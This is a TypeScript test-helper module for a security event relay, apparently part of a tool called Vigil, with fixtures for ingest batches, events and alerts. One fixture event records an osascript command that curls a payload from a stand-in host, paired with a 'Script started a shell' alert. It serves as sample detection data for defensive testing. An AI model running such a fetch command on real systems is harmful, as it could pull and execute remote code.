import { mkdtempSync, rmSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { gzipSync } from 'node:zlib';
import { IngestRequest, type ShipRecord } from './wire.js';
import { startRelay, type RelayConfig, type RelayServer } from './index.js';

/** A relay config pointed at a fresh private temp directory. */
export function testConfig(overrides: Partial<RelayConfig> = {}): RelayConfig {
  return {
    dataDir: mkdtempSync(join(tmpdir(), 'vigil-relay-test-')),
    host: '127.0.0.1',
    port: 0,
    maxDiskBytes: 10 * 1024 * 1024 * 1024,
    retentionDays: 30,
    maxBodyBytes: 16 * 1024 * 1024,
    ratePerSec: 30,
    burst: 60,
    ...overrides,
  };
}

export interface TestRelay extends RelayServer {
  config: RelayConfig;
}

/** Starts a real relay on an ephemeral port; closeRelay stops it and cleans up. */
export async function startTestRelay(overrides: Partial<RelayConfig> = {}): Promise<TestRelay> {
  const config = testConfig(overrides);
  const relay = await startRelay(config);
  return { ...relay, config };
}

export async function closeRelay(relay: TestRelay): Promise<void> {
  await relay.close();
  rmSync(relay.config.dataDir, { recursive: true, force: true });
}

/** POSTs a body and parses the JSON reply (undefined when the reply is empty). */
export async function post(
  port: number,
  path: string,
  body: string | Buffer,
  headers: Record<string, string> = {},
): Promise<{ status: number; json: unknown; headers: Headers }> {
  const res = await fetch(`http://127.0.0.1:${port}${path}`, { method: 'POST', body, headers });
  const text = await res.text();
  return {
    status: res.status,
    json: text === '' ? undefined : JSON.parse(text),
    headers: res.headers,
  };
}

/** gzip a JSON payload the way the shipper will. */
export function gzipped(payload: unknown): Buffer {
  return gzipSync(Buffer.from(JSON.stringify(payload)));
}

/** A stored event body as Vigil itself keeps it: everything but `raw`. */
export function execEventBody(id: string, ts: number): Record<string, unknown> {
  return {
    id,
    ts,
    source: 'osquery',
    kind: 'process.exec',
    process: {
      pid: 8421,
      path: '/usr/bin/osascript',
      args: ['-e', 'do shell script "curl http://example.test/payload"'],
      signing: 'apple',
      parentPath: '/bin/zsh',
    },
  };
}

/** One event ship record, wire-shaped (unparsed, like it arrives off the net). */
export function eventRecord(id: string, ts: number): unknown {
  return { r: 'event', id, ts, body: execEventBody(id, ts) };
}

/** One alert ship record, wire-shaped. */
export function alertRecord(id: string, ts: number): unknown {
  return {
    r: 'alert',
    id,
    ts,
    body: {
      id,
      createdAt: ts,
      updatedAt: ts,
      ruleId: 'core.exec-script',
      ruleVersion: 1,
      title: 'Script started a shell',
      summary: 'osascript ran a command line fetched from the internet.',
      severity: 'high',
      fidelity: 'high',
      notify: 'popup',
      status: 'open',
      containment: 'none',
      eventIds: [id],
    },
  };
}

/** A full ingest request body with the initial cursor. */
export function batchRequest(records: unknown[], deviceId = 'laptop-1'): string {
  return JSON.stringify({ v: 1, deviceId, cursor: { ts: 0, id: '' }, records });
}

/** Parses a wire batch into validated records, the way the ingest handler does. */
export function parsedRecords(batch: string): ShipRecord[] {
  return IngestRequest.parse(JSON.parse(batch)).records;
}
